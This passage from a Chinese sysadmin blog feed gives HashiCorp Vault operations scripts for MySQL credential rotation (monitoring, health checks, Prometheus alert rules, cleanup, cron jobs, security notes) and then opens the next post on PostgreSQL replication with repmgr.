 &lt;/a&gt;
&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
export VAULT_ADDR=&amp;#39;http://127.0.0.1:8200&amp;#39;
echo &amp;#34;=== 凭据轮换监控 ===&amp;#34;
date
# 检查静态角色轮换状态
echo -e &amp;#34;\n1. 静态角色轮换状态:&amp;#34;
STATIC_INFO=$(/opt/vault/bin/vault read database/static-creds/app-static-user 2&amp;gt;/dev/null)
echo &amp;#34;$STATIC_INFO&amp;#34; | grep -E &amp;#34;(last_vault_rotation|next_vault_rotation|rotation_period)&amp;#34;
# 检查动态角色配置
echo -e &amp;#34;\n2. 动态角色TTL配置:&amp;#34;
/opt/vault/bin/vault read database/roles/vault-dynamic-role 2&amp;gt;/dev/null | grep -E &amp;#34;(default_ttl|max_ttl)&amp;#34;
# 检查活跃租约数量
echo -e &amp;#34;\n3. 活跃租约统计:&amp;#34;
LEASE_COUNT=$(/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2&amp;gt;/dev/null | tail -n &amp;#43;3 | wc -l)
echo &amp;#34;活跃动态凭据租约: $LEASE_COUNT&amp;#34;
# 检查MySQL用户数量
echo -e &amp;#34;\n4. MySQL用户统计:&amp;#34;
docker exec mysql-vault-test mysql -uroot -prootpassword123 -e &amp;#34;SELECT COUNT(*) as &amp;#39;动态用户数&amp;#39; FROM mysql.user WHERE user LIKE &amp;#39;v-%&amp;#39;;&amp;#34; 2&amp;gt;/dev/null
echo -e &amp;#34;\n=== 监控完成 ===&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="-阶段5高级监控告警"&gt;&lt;span&gt;🚨 阶段5：高级监控告警&lt;/span&gt;
 &lt;a href="#-%e9%98%b6%e6%ae%b55%e9%ab%98%e7%ba%a7%e7%9b%91%e6%8e%a7%e5%91%8a%e8%ad%a6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="51-prometheus指标配置"&gt;&lt;span&gt;5.1 Prometheus指标配置&lt;/span&gt;
 &lt;a href="#51-prometheus%e6%8c%87%e6%a0%87%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 启用Vault Prometheus指标
/opt/vault/bin/vault write sys/metrics/config \
 usage_gauge_period=&amp;#34;30s&amp;#34; \
 maximum_gauge_cardinality=500&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="52-健康检查脚本-optvaultbinvault-health-checksh"&gt;&lt;span&gt;5.2 健康检查脚本 (&lt;code&gt;/opt/vault/bin/vault-health-check.sh&lt;/code&gt;)&lt;/span&gt;
 &lt;a href="#52-%e5%81%a5%e5%ba%b7%e6%a3%80%e6%9f%a5%e8%84%9a%e6%9c%ac-optvaultbinvault-health-checksh" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
export VAULT_ADDR=&amp;#39;http://127.0.0.1:8200&amp;#39;
echo &amp;#34;=== Vault健康检查 ===&amp;#34;
date
# 检查Vault状态
echo -e &amp;#34;\n1. Vault服务状态:&amp;#34;
/opt/vault/bin/vault status 2&amp;gt;/dev/null
# 检查密封状态
echo -e &amp;#34;\n2. 密封状态:&amp;#34;
/opt/vault/bin/vault status 2&amp;gt;/dev/null | grep -E &amp;#34;(Sealed|Initialized)&amp;#34;
# 检查数据库引擎状态
echo -e &amp;#34;\n3. 数据库引擎状态:&amp;#34;
/opt/vault/bin/vault secrets list -detailed | grep database
# 检查租约状态
echo -e &amp;#34;\n4. 租约状态:&amp;#34;
ACTIVE_LEASES=$(/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2&amp;gt;/dev/null | tail -n &amp;#43;3 | wc -l)
echo &amp;#34;活跃动态租约: $ACTIVE_LEASES&amp;#34;
# 检查静态角色状态
echo -e &amp;#34;\n5. 静态角色状态:&amp;#34;
STATIC_TTL=$(/opt/vault/bin/vault read database/static-creds/app-static-user 2&amp;gt;/dev/null | grep ttl | awk &amp;#39;{print $2}&amp;#39;)
echo &amp;#34;静态角色TTL: $STATIC_TTL&amp;#34;
# 检查审计日志
echo -e &amp;#34;\n6. 审计日志状态:&amp;#34;
AUDIT_LOG_SIZE=$(sudo ls -lh /opt/vault/audit/vault-audit.log 2&amp;gt;/dev/null | awk &amp;#39;{print $5}&amp;#39; || echo &amp;#34;N/A&amp;#34;)
echo &amp;#34;审计日志大小: $AUDIT_LOG_SIZE&amp;#34;
echo -e &amp;#34;\n=== 健康检查完成 ===&amp;#34;
# 退出码判断
if /opt/vault/bin/vault status 2&amp;gt;/dev/null | grep -q &amp;#34;Sealed.*false&amp;#34;; then
 echo &amp;#34;✅ Vault健康状态: 正常&amp;#34;
 exit 0
else
 echo &amp;#34;❌ Vault健康状态: 异常&amp;#34;
 exit 1
fi&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="53-告警规则-optvaultbinvault-alert-rulesyml"&gt;&lt;span&gt;5.3 告警规则 (&lt;code&gt;/opt/vault/bin/vault-alert-rules.yml&lt;/code&gt;)&lt;/span&gt;
 &lt;a href="#53-%e5%91%8a%e8%ad%a6%e8%a7%84%e5%88%99-optvaultbinvault-alert-rulesyml" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;groups:
- name: vault_alerts
 rules:
 - alert: VaultSealed
 expr: vault_core_sealed == 1
 for: 1m
 labels:
 severity: critical
 annotations:
 summary: &amp;#34;Vault实例已密封&amp;#34;
 description: &amp;#34;Vault实例 {{ $labels.instance }} 处于密封状态，需要解封&amp;#34;
 - alert: HighLeaseUsage
 expr: count(vault_expire_num_leases) &amp;gt; 50
 for: 5m
 labels:
 severity: warning
 annotations:
 summary: &amp;#34;租约使用率过高&amp;#34;
 description: &amp;#34;Vault实例 {{ $labels.instance }} 活跃租约数量超过50个&amp;#34;
 - alert: StaticCredentialExpiring
 expr: vault_database_static_role_rotation_scheduled{role=&amp;#34;app-static-user&amp;#34;} &amp;lt; 3600
 for: 2m
 labels:
 severity: warning
 annotations:
 summary: &amp;#34;静态凭据即将轮换&amp;#34;
 description: &amp;#34;静态角色 {{ $labels.role }} 将在1小时内自动轮换&amp;#34;
 - alert: DatabaseConnectionFailure
 expr: increase(vault_database_connection_errors_total[5m]) &amp;gt; 3
 for: 2m
 labels:
 severity: critical
 annotations:
 summary: &amp;#34;数据库连接频繁失败&amp;#34;
 description: &amp;#34;Vault到数据库的连接在5分钟内失败超过3次&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="54-自动清理脚本-optvaultbinvault-cleanupsh"&gt;&lt;span&gt;5.4 自动清理脚本 (&lt;code&gt;/opt/vault/bin/vault-cleanup.sh&lt;/code&gt;)&lt;/span&gt;
 &lt;a href="#54-%e8%87%aa%e5%8a%a8%e6%b8%85%e7%90%86%e8%84%9a%e6%9c%ac-optvaultbinvault-cleanupsh" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
export VAULT_ADDR=&amp;#39;http://127.0.0.1:8200&amp;#39;
echo &amp;#34;=== Vault清理维护 ===&amp;#34;
date
# 清理过期的租约
echo -e &amp;#34;\n1. 清理过期租约:&amp;#34;
EXPIRED_LEASES=$(/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2&amp;gt;/dev/null | tail -n &amp;#43;3)
if [ ! -z &amp;#34;$EXPIRED_LEASES&amp;#34; ]; then
 for lease in $EXPIRED_LEASES; do
 LEASE_INFO=$(/opt/vault/bin/vault lease lookup database/creds/vault-dynamic-role/$lease 2&amp;gt;/dev/null)
 if echo &amp;#34;$LEASE_INFO&amp;#34; | grep -q &amp;#34;lease expired&amp;#34;; then
 echo &amp;#34;清理过期租约: $lease&amp;#34;
 /opt/vault/bin/vault lease revoke database/creds/vault-dynamic-role/$lease 2&amp;gt;/dev/null
 fi
 done
fi
# 清理MySQL中的孤立用户
echo -e &amp;#34;\n2. 清理MySQL孤立用户:&amp;#34;
docker exec mysql-vault-test mysql -uroot -prootpassword123 -e &amp;#34;
SELECT CONCAT(&amp;#39;DROP USER \\&amp;#39;&amp;#39;, user, &amp;#39;\\&amp;#39;@\\&amp;#39;&amp;#39;, host, &amp;#39;\\&amp;#39;;&amp;#39;) 
FROM mysql.user 
WHERE user LIKE &amp;#39;v-%&amp;#39; 
AND user NOT IN (
 SELECT DISTINCT SUBSTRING_INDEX(SUBSTRING_INDEX(json_extract(creation_statement, &amp;#39;$[0]&amp;#39;), &amp;#39;&amp;#39;&amp;#39;&amp;#39;, 2), &amp;#39;&amp;#39;&amp;#39;&amp;#39;, -1)
 FROM vault_token.vault_dynamic_users
);&amp;#34; 2&amp;gt;/dev/null
# 轮转审计日志（如果超过100MB）
echo -e &amp;#34;\n3. 审计日志维护:&amp;#34;
AUDIT_LOG_SIZE=$(sudo ls -l /opt/vault/audit/vault-audit.log 2&amp;gt;/dev/null | awk &amp;#39;{print $5}&amp;#39;)
if [ &amp;#34;$AUDIT_LOG_SIZE&amp;#34; -gt 104857600 ]; then # 100MB
 echo &amp;#34;审计日志超过100MB，执行轮转&amp;#34;
 sudo mv /opt/vault/audit/vault-audit.log /opt/vault/audit/vault-audit.log.$(date &amp;#43;%Y%m%d_%H%M%S)
 sudo systemctl reload vault # 重新加载以创建新日志文件
fi
echo -e &amp;#34;\n=== 清理完成 ===&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="-运维最佳实践"&gt;&lt;span&gt;📈 运维最佳实践&lt;/span&gt;
 &lt;a href="#-%e8%bf%90%e7%bb%b4%e6%9c%80%e4%bd%b3%e5%ae%9e%e8%b7%b5" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="日常运维命令"&gt;&lt;span&gt;日常运维命令&lt;/span&gt;
 &lt;a href="#%e6%97%a5%e5%b8%b8%e8%bf%90%e7%bb%b4%e5%91%bd%e4%bb%a4" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 查看所有配置状态
/opt/vault/bin/lease-manager.sh
/opt/vault/bin/rotation-monitor.sh
/opt/vault/bin/vault-health-check.sh

# 手动轮换静态凭据
/opt/vault/bin/vault write -force database/rotate-role/app-static-user

# 查看审计日志
sudo tail -f /opt/vault/audit/vault-audit.log | jq .&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="定时任务配置"&gt;&lt;span&gt;定时任务配置&lt;/span&gt;
 &lt;a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 添加到crontab
# 每5分钟健康检查
*/5 * * * * /opt/vault/bin/vault-health-check.sh &amp;gt;&amp;gt; /var/log/vault-health.log 2&amp;gt;&amp;amp;1

# 每小时租约监控
0 * * * * /opt/vault/bin/lease-manager.sh &amp;gt;&amp;gt; /var/log/vault-lease.log 2&amp;gt;&amp;amp;1

# 每天凌晨清理维护
0 2 * * * /opt/vault/bin/vault-cleanup.sh &amp;gt;&amp;gt; /var/log/vault-cleanup.log 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="故障排查指南"&gt;&lt;span&gt;故障排查指南&lt;/span&gt;
 &lt;a href="#%e6%95%85%e9%9a%9c%e6%8e%92%e6%9f%a5%e6%8c%87%e5%8d%97" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Vault密封状态&lt;/strong&gt;: 使用解封密钥解封&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据库连接失败&lt;/strong&gt;: 检查MySQL服务状态和网络连通性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭据生成失败&lt;/strong&gt;: 检查数据库用户权限和Vault角色配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;租约过期&lt;/strong&gt;: 检查TTL配置和租约续期逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="-安全注意事项"&gt;&lt;span&gt;🔒 安全注意事项&lt;/span&gt;
 &lt;a href="#-%e5%ae%89%e5%85%a8%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a1%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;: 所有角色按需分配最小必要权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭据生命周期&lt;/strong&gt;: 动态凭据30分钟TTL，静态凭据24小时自动轮换&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;审计追踪&lt;/strong&gt;: 所有操作记录到审计日志&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控告警&lt;/strong&gt;: 实时监控关键指标并设置告警&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定期维护&lt;/strong&gt;: 定期清理过期租约和孤立用户&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="-总结"&gt;&lt;span&gt;📚 总结&lt;/span&gt;
 &lt;a href="#-%e6%80%bb%e7%bb%93" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;本方案实现了完整的数据库凭据动态管理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;✅ &lt;strong&gt;动态凭据&lt;/strong&gt;: 短期访问，自动回收&lt;/li&gt;
&lt;li&gt;✅ &lt;strong&gt;静态凭据&lt;/strong&gt;: 长期使用，自动轮换&lt;/li&gt;
&lt;li&gt;✅ &lt;strong&gt;安全审计&lt;/strong&gt;: 完整操作记录&lt;/li&gt;
&lt;li&gt;✅ &lt;strong&gt;监控告警&lt;/strong&gt;: 实时状态监控&lt;/li&gt;
&lt;li&gt;✅ &lt;strong&gt;自动化运维&lt;/strong&gt;: 脚本化日常维护&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过这套体系，可以有效提升数据库访问安全性，降低凭据泄露风险，实现合规性要求。&lt;/p&gt;
&lt;h2 class="heading-element" id="-参考资料"&gt;&lt;span&gt;📝 参考资料&lt;/span&gt;
 &lt;a href="#-%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href="https://developer.hashicorp.com/vault/docs" target="_blank" rel="external nofollow noopener noreferrer"&gt;Vault官方文档&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://static.0x5c0f.cc/document/archive/HashiCorpVault%E5%AE%9E%E6%96%BD%E5%AF%B9%E8%AF%9D%E8%AE%B0%E5%BD%95.pdf" target="_blank" rel="external nofollow noopener noreferrer"&gt;HashiCorp Vault 实施对话记录&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description></item><item><title>PostgreSQL主从复制及repmgr高可用</title><link>https://blog.0x5c0f.cc/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/</link><pubDate>Fri, 29 Aug 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/pgsql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8Arepmgr%E9%AB%98%E5%8F%AF%E7%94%A8/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;p&gt;&lt;em&gt;&lt;em&gt;本文为&lt;code&gt;PostgreSQL&lt;/code&gt;主从复制及&lt;code&gt;repmgr&lt;/code&gt;高可用解决方案, 单主从架构, 适用于中小型数据库集群。文中记录为真是场景测试案例(未进行参数优化)，集群于亚马逊&lt;code&gt;EC2&lt;/code&gt;，&lt;code&gt;VIP&lt;/code&gt;能力由&lt;/em&gt;&lt;code&gt;亚马逊私有辅助IP&lt;/code&gt;&lt;em&gt;实现&lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="基础环境信息"&gt;&lt;span&gt;基础环境信息&lt;/span&gt;
 &lt;a href="#%e5%9f%ba%e7%a1%80%e7%8e%af%e5%a2%83%e4%bf%a1%e6%81%af" class="heading-mark"&gt;
